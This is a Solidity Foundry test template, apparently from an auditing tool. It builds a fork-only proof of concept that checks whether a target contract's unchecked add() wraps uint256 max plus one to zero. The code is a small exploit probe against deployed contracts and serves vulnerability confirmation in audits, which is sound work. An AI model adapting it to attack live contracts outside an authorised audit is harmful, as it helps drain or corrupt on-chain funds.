// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked arithmetic wraps (no overflow check)
/// @notice Detector: unchecked-block. The target does arithmetic in an
///         `unchecked {}` block (or pre-0.8 code with no SafeMath), so
///         values WRAP instead of reverting -- minting, balances, and
///         accounting can overflow into tiny / huge values.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt add() to the target's real
///      unchecked arithmetic function.

interface IVictim {
    function add(uint256 a, uint256 b) external returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        // max + 1 wraps to 0 in unchecked arithmetic; a checked target
        // reverts and this call fails.
        (bool ok, bytes memory ret) = target.call(
            abi.encodeWithSignature("add(uint256,uint256)", type(uint256).max, uint256(1))
        );
        require(ok, "add() reverted -- target checks overflow (not vulnerable to wrap)");
        uint256 result = abi.decode(ret, (uint256));
        console.log("max + 1 =", result);
        assertEq(result, 0, "exploit did not reproduce: no wrap");
    }
}
